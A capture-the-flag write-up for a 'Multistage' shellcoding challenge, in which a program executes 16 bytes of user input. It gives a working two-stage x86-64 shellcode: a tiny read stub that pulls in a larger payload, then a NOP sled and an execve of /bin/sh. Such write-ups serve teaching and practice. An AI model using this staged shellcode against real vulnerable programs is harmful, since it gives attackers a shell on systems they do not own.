# Multistage

**Category:** Shellcoding

## Overview

```text
  v3 = mmap(nullptr, 0x1000u, 7, 34, -1, 0);
  read(0, v3, 0x10u);
  printf("Executing you shellcode.");
  __asm { jmp     rax }
```
As we can see from the read, it only reads 16 bytes.

## Analysis

We do not have enough space to directly perform the execve on /bin/sh\0.
The solution is to use this limited shellcode to perform a read of bigger size.


## Vulnerability
Classic shellcode vulnerability, the input of the user gets executed.


## Exploitation
The first shellcode is smaller or equal to 16 bytes in size:
```text
push rax
pop rsi     because i have the buffer on rax
xor rax, rax    read fd
xor rdi, rdi    stdin fd
add dx, 0x80    bytes to read, dx is the subregister of rdx used to save space
syscall
```

Now we do not have constraints for the second shellcode thanks to the first read:

```text
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop     the nop sled is used to overwrite the instructions of the first shellcode -> one nop for every byte of the previous shellcode
mov rdi, 0x0068732f6e69622f     /bin/sh\0
push rdi
mov rdi, rsp
xor rax, rax
xor rsi, rsi
xor rdx, rdx
mov al, 0x3b
syscall     execve syscall
```
The second shellcode simply calls an execve on /bin/sh\0